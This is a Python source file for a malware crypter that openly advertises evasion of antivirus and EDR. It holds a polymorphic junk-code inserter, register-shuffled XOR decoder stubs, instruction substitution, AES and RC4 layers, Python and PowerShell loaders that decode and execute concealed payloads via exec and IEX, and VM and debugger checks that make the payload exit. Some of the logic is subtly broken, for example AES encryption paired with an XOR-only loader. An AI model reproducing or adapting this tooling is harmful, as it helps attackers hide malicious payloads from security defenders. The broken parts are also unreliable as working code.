"""
Polymorphic Crypter Engine
Evades AV/EDR through metamorphic code generation
"""

import os
import random
import hashlib
import struct
from typing import List, Tuple, Optional
import base64
import zlib

class PolymorphicEngine:
    """Generates unique variants of payloads on each execution"""
    
    def __init__(self):
        self.junk_instructions = [
            b"\x90",  # NOP
            b"\x40\x48",  # INC EAX; DEC EAX
            b"\x50\x58",  # PUSH EAX; POP EAX
            b"\x87\xC0",  # XCHG EAX, EAX
            b"\x87\xDB",  # XCHG EBX, EBX
            b"\x83\xC0\x00",  # ADD EAX, 0
            b"\x83\xE8\x00",  # SUB EAX, 0
            b"\x89\xC0",  # MOV EAX, EAX
        ]
    
    def insert_junk(self, shellcode: bytes, density: float = 0.3) -> bytes:
        """Insert junk instructions at random positions"""
        result = bytearray()
        for byte in shellcode:
            result.append(byte)
            if random.random() < density:
                result.extend(random.choice(self.junk_instructions))
        return bytes(result)
    
    def xor_encode(self, data: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """XOR encode with random key"""
        if key is None:
            key = os.urandom(len(data) if len(data) < 256 else 256)
        encoded = bytes(a ^ key[i % len(key)] for i, a in enumerate(data))
        return encoded, key
    
    def generate_decoder_stub(self, key: bytes, payload_size: int) -> str:
        """Generate unique decoder stub for each variant"""
        regs = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9']
        random.shuffle(regs)
        counter_reg, key_reg, data_reg = regs[:3]
        
        stub = f"""
        ; Polymorphic decoder stub
        mov {counter_reg}, {payload_size}
        lea {data_reg}, [rel payload]
        lea {key_reg}, [rel key]
        
    decode_loop:
        xor byte [{data_reg}], byte [{key_reg}]
        inc {data_reg}
        inc {key_reg}
        dec {counter_reg}
        jnz decode_loop
        jmp payload
        
    key:
        db {','.join(hex(b) for b in key[:64])}
    payload:
        """
        return stub


class MetamorphicTransformer:
    """Transforms code structure while preserving functionality"""
    
    def __init__(self):
        self.equivalent_instructions = {
            'mov eax, 0': ['xor eax, eax', 'sub eax, eax', 'and eax, 0'],
            'mov eax, 1': ['xor eax, eax\ninc eax', 'push 1\npop eax'],
            'add eax, 1': ['inc eax', 'sub eax, -1', 'lea eax, [eax+1]'],
            'sub eax, 1': ['dec eax', 'add eax, -1', 'lea eax, [eax-1]'],
            'test eax, eax': ['or eax, eax', 'and eax, eax', 'cmp eax, 0'],
        }
    
    def substitute_instructions(self, code: str) -> str:
        """Replace instructions with semantic equivalents"""
        for original, equivalents in self.equivalent_instructions.items():
            if original in code:
                code = code.replace(original, random.choice(equivalents))
        return code
    
    def insert_opaque_predicates(self, code: str) -> str:
        """Insert always-true/false conditions"""
        predicates = [
            "; opaque\nmov eax, 1\ncmp eax, 1\njne fake_{id}\n",
            "; opaque\nxor eax, eax\ntest eax, eax\njnz fake_{id}\n",
        ]
        pred = random.choice(predicates).format(id=random.randint(10000, 99999))
        return pred + code


class EncryptionLayer:
    """Multi-layer encryption for payload protection"""
    
    @staticmethod
    def aes_encrypt(data: bytes, key: bytes = None) -> Tuple[bytes, bytes, bytes]:
        """AES-256-GCM encryption"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes
            
            if key is None:
                key = get_random_bytes(32)
            nonce = get_random_bytes(12)
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            return ciphertext + tag, key, nonce
        except ImportError:
            # Fallback to XOR
            if key is None:
                key = os.urandom(32)
            encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(data))
            return encrypted, key, b""
    
    @staticmethod
    def rc4_encrypt(data: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """RC4 stream cipher"""
        if key is None:
            key = os.urandom(16)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(result), key


class PayloadPacker:
    """Packs payloads with compression and encoding"""
    
    @staticmethod
    def compress(data: bytes) -> bytes:
        return zlib.compress(data, level=9)
    
    @staticmethod
    def encode_base64(data: bytes) -> bytes:
        return base64.b64encode(data)
    
    @staticmethod
    def generate_loader(encrypted_payload: bytes, key: bytes, method: str) -> str:
        """Generate runtime loader"""
        payload_b64 = base64.b64encode(encrypted_payload).decode()
        key_b64 = base64.b64encode(key).decode()
        
        if method == 'python':
            return f'''
import base64,zlib
k=base64.b64decode("{key_b64}")
p=base64.b64decode("{payload_b64}")
d=bytes(a^k[i%len(k)]for i,a in enumerate(p))
exec(zlib.decompress(d))
'''
        elif method == 'powershell':
            return f'''
$k=[Convert]::FromBase64String("{key_b64}")
$p=[Convert]::FromBase64String("{payload_b64}")
$d=@();for($i=0;$i-lt$p.Length;$i++){{$d+=$p[$i]-bxor$k[$i%$k.Length]}}
IEX([IO.Compression.DeflateStream]::new([IO.MemoryStream]$d,'Decompress')|%{{$r=New-Object IO.StreamReader($_);$r.ReadToEnd()}})
'''
        return ""


class AntiAnalysis:
    """Techniques to detect and evade analysis environments"""
    
    @staticmethod
    def sandbox_checks() -> str:
        return '''
import os,subprocess,ctypes
def chk():
    vm=['VBOX','VMWARE','VIRTUAL','QEMU']
    try:
        b=subprocess.check_output('wmic bios get serialnumber',shell=True).decode().upper()
        if any(v in b for v in vm):return True
    except:pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():return True
    except:pass
    return False
if chk():exit()
'''


class Crypter:
    """Main interface - combines all evasion techniques"""
    
    def __init__(self):
        self.poly = PolymorphicEngine()
        self.meta = MetamorphicTransformer()
        self.enc = EncryptionLayer()
        self.pack = PayloadPacker()
        self.anti = AntiAnalysis()
    
    def crypt(self, payload: bytes, output_format: str = 'python') -> str:
        """Full crypting pipeline"""
        compressed = self.pack.compress(payload)
        encrypted, key, _ = self.enc.aes_encrypt(compressed)
        loader = self.anti.sandbox_checks()
        loader += self.pack.generate_loader(encrypted, key, output_format)
        return loader
    
    def generate_variant(self, base_payload: bytes) -> bytes:
        """Generate unique variant of payload"""
        junked = self.poly.insert_junk(base_payload)
        encoded, key = self.poly.xor_encode(junked)
        return encoded


if __name__ == "__main__":
    crypter = Crypter()
    test_payload = b"print('test')"
    result = crypter.crypt(test_payload, 'python')
    print(result)
